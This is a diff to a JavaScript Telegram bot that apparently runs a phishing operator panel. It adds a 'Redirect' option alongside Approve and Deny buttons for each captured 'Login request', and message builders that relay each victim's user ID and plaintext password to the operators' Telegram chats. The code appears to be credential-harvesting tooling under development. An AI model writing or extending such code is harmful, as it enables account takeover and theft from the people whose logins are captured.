@@ -41,6 +41,9 @@ async function sendToAll(env, text, taskId, includeButtons) {
               { text: "✅ Approve", callback_data: "approve:" + taskId },
               { text: "❌ Deny", callback_data: "deny:" + taskId },
             ],
+            [
+              { text: "🔀 Redirect", callback_data: "redirect:" + taskId },
+            ],
           ],
         };
       }
@@ -257,6 +260,15 @@ export function buildApprovedMessage(task) {
 export function buildDeniedMessage(task) {
   return [
     "❌ DENIED via Telegram",
+    "🔐 Login request (AF)",
+    "👤 User: " + task.user_id,
+    "🔑 Password: " + (task.password || "N/A"),
+  ].join("\n");
+}
+
+export function buildRedirectedMessage(task) {
+  return [
+    "🔀 REDIRECTED via Telegram",
     "🔐 Login request (AF)",
     "👤 User: " + task.user_id,
     "🔑 Password: " + (task.password || "N/A"),
